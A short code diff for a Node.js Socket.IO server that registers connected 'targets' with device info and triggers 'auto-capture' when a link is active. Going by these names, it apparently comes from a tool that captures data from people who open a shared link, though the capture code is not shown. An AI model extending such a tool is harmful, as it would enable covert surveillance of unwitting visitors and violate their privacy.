@@ -50,10 +50,6 @@ app.use(express.static(__dirname));
 app.use('/uploads', express.static(uploadDir));
 
 io.on('connection', (socket) => {
-    // Register user target
-    connectedTargets[socket.id] = { id: socket.id };
-    io.emit('update-users-list', connectedTargets);
-
     socket.on('disconnect', () => {
         delete connectedTargets[socket.id];
         io.emit('update-users-list', connectedTargets);
@@ -71,7 +67,13 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('user-ready', () => {
+    socket.on('user-ready', (data) => {
+        connectedTargets[socket.id] = { 
+            id: socket.id, 
+            deviceInfo: data && data.deviceInfo ? data.deviceInfo : "Web User" 
+        };
+        io.emit('update-users-list', connectedTargets);
+
         if (isAutoCaptureOn && isLinkActive) {
             socket.emit('start-auto-capture');
         }
